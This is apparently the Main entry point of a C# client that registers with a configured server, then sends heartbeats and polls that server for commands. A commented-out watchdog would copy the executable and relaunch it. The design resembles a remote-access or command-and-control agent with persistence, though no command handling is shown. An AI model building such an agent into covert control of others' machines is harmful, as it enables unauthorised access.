using System;
using System.IO;
using System.Threading.Tasks;
using True.Core;
using True.Features;
using True.Helper;

namespace True
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            ConfigManager.EnsureConfigExists();
            Logger.Init();

            Logger.Debug("Startup", "Debug log test");
            Logger.Info("Startup", "Logger initialized");
            Logger.Info("Startup", "Working directory: " + Directory.GetCurrentDirectory());

            string server = ConfigManager.Get("General", "server_url", "NOT_FOUND");
            Logger.Info("Startup", "Loaded server_url: " + server);

            // 👉 Step 1: Register the client first
            bool registered = await ClientRegistrar.RegisterAsync();
            if (!registered)
            {
                Logger.Error("Main", "Registration failed. Exiting...");
                return;
            }

            // 👉 Step 2: Launch watchdog only after successful registration
            if (ConfigManager.GetBool("General", "watchdog", false))
            {
                //string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                //Watchdog.EnsureBackupCopy(path);
                //Watchdog.Start(args);
            }

            // 👉 Step 3: Begin communication with server

            Communicator.Init();

            Task heartbeatTask = Communicator.StartHeartbeatAsync();
            Task commandsTask = Communicator.StartCommandPollingAsync();

            await Task.WhenAll(heartbeatTask, commandsTask);

        }
    }
}
